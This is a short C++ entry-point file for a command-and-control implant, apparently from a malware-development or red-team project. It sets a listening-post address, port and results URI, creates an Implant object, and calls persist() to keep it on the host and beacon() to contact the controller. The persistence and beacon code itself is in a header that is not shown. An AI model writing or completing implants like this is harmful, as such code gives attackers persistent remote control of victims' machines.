#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif // _WIN32

#include "implant.h"

#include <iostream>
#include <boost/system/system_error.hpp>
#include <stdio.h>

int main ()
{
    // Specify address, port and URI of listening post endpoint
    const auto host = "192.168.244.1";
    const auto port = "5000";
    const auto uri = "/results";

    // Instantiate our implant object
    Implant implant{host, port, uri};
    // Call the beacon method to start beaconing the loop
    try
    {
        implant.persist();
        implant.beacon();
    }
    catch (const boost::system::system_error &se)
    {
        printf("\nSystem error: %s\n", se.what());
    }
    return 0;
}
